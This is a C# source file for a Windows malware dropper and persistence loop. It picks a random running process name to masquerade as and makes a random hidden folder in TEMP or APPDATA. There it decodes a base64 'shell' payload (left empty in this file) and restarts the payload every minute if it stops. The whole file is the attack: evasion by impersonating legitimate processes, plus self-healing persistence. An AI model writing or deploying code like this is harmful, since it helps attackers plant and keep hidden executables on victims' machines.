using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Diagnostics;

namespace test {
	public partial class test  {

		// checks if program is running		
		private static bool prg_running(string full_path) {
		    string file_path =  Path.GetDirectoryName(full_path);
		    string file_name = Path.GetFileNameWithoutExtension(full_path).ToLower();
		    bool is_running = false;
		
		    System.Diagnostics.Process[] pList = System.Diagnostics.Process.GetProcessesByName(file_name);
		
		    foreach(System.Diagnostics.Process p in pList) { // gets a list of running processes and checks if program is in the list running
		        if (p.MainModule.FileName.StartsWith(file_path, StringComparison.InvariantCultureIgnoreCase))
		        {
		            is_running = true;
		            break;
		        }
		    }
		
		    return is_running; // returns true or false
		}
		private static System.Diagnostics.Process[] list_procs() {  // gets list of processes
		    System.Diagnostics.Process[] procs = System.Diagnostics.Process.GetProcesses(); 
		    return procs;  
		}
		private static System.DateTime check_fd(string file) { 
			//System.DateTime created = System.IO.File.GetLastWriteTime("C:\\Users\\vagrant\\Documents\\input.txt");
		    System.DateTime created = System.IO.File.GetLastWriteTime(file); // checks the last time the file was modified
			return created;
		}
		public static bool is_empty(string file) { // checks if file exists or not
			Environment.CurrentDirectory = Environment.ExpandEnvironmentVariables("%TEMP%");
		    var info = new FileInfo(file);
		    if(info.Length == 0) // if 0 length returns true
		        return true;
		        
		    return false; // if not 0 length returns false
		}
		static void Main(string[] args) {
			Random rand = new Random();
			int num;
			string[] list = { "firefox", "chrome", "chromium", "lsass", "explorer", "cmd", "powershell", "dropper" }; // our blacklisted application variable

			// base64 of our program
			string b64 = @"";

			string tmp_ev = "%TEMP%";
			string appdt_ev = "%APPDATA%";
			string doop = "";
			string file = "";
			string env_expand = Environment.ExpandEnvironmentVariables(tmp_ev);
			string resolved_pth = env_expand + "\\input.txt";
			string save_file = env_expand + "\\save.txt";

			System.DateTime loop_check;

			if(File.Exists(save_file)) { // check if the file containing the directory for the shell exists
				if(is_empty(save_file) == false) { // check if file is empty or not
					System.Console.WriteLine("File is not empty");
					file = File.ReadAllText(save_file); // read the directory string from file and save to file variable
					System.Console.WriteLine("{0}", file);
				}
			} else {
		
				System.Diagnostics.Process[] procs = list_procs(); // get list of running processes
				
				while(true) {
					num = rand.Next(procs.Length); // select a process randomly
		
					int i;
		
					for(i = 0; i < list.Length; i++) { // checks if the selected process is on the blacklist
						if(String.Equals(list[i], procs[num].ProcessName.ToLower())) {
							num = rand.Next(procs.Length);
							continue;
						}
							
					}
					break;
				}
		
				int L = 32;
				string ud = procs[num].ProcessName;
		
				// concat the exe to the end
				ud = ud + ".exe";
	
				string[] arr = { tmp_ev, appdt_ev }; // select either %TEMP% or %APPDATA%
		
				num = rand.Next(arr.Length); // randomly select a number in the array
				string rnd = Environment.ExpandEnvironmentVariables(arr[num]); // assign whatever is in arr[num] to rnd
		
				string dr = System.Guid.NewGuid().ToString("N").Substring(0, L); // generate a 32 guid string
				dr = dr.Remove(0, 16); // remove first 16 characters from the generated string
				doop = rnd + @"\" + dr + @"\"; // concat the directory together
				
				System.IO.Directory.CreateDirectory(doop); // create the directory
		
				file = doop + ud; // concat the directory with the filename
	
				File.WriteAllText(save_file, file);
	
				if(!File.Exists(resolved_pth)) { // check if the b64 file exists
					System.Console.WriteLine("Creating base64 file");
					File.WriteAllText(resolved_pth, b64); // writing the b64 file
					var text = File.ReadAllText(resolved_pth); // reading the b64 from file
					Byte[] bytes = Convert.FromBase64String(text); // decoding the b64
					File.WriteAllBytes(file, bytes); // writing to the file that will contain the shell
				}
			}
				
			System.DateTime initial_check = check_fd(resolved_pth);
	
			while(true) { // main loop
				Console.WriteLine("Waiting a minute");
			    Thread.Sleep(60 * 1 * 1000); // sleep for 1 minute
				loop_check = check_fd(resolved_pth); // check if the b64 file needs to be updated or not
				if(!String.Equals(loop_check, initial_check)) { // if the b64 file needs to be updated, update it
					System.Console.WriteLine("Original file needs to be updated");
					var text = File.ReadAllText(resolved_pth);
					Byte[] bytes = Convert.FromBase64String(text);
					File.WriteAllBytes(file, bytes);
					continue;
				}
				System.Console.WriteLine("Original file doesn't need to be updated");
				if(prg_running(file) == false) {
					System.Console.WriteLine("Program is not running");
					if(!File.Exists(file)) {
						var text = File.ReadAllText(resolved_pth);
						Byte[] bytes = Convert.FromBase64String(text);
						File.WriteAllBytes(file, bytes);
					}
					System.Diagnostics.Process obj_proc = System.Diagnostics.Process.Start(file);
					obj_proc.Close();
					continue;
				}
				System.Console.WriteLine("Program is running");
				continue;
			}
		}
	}
}
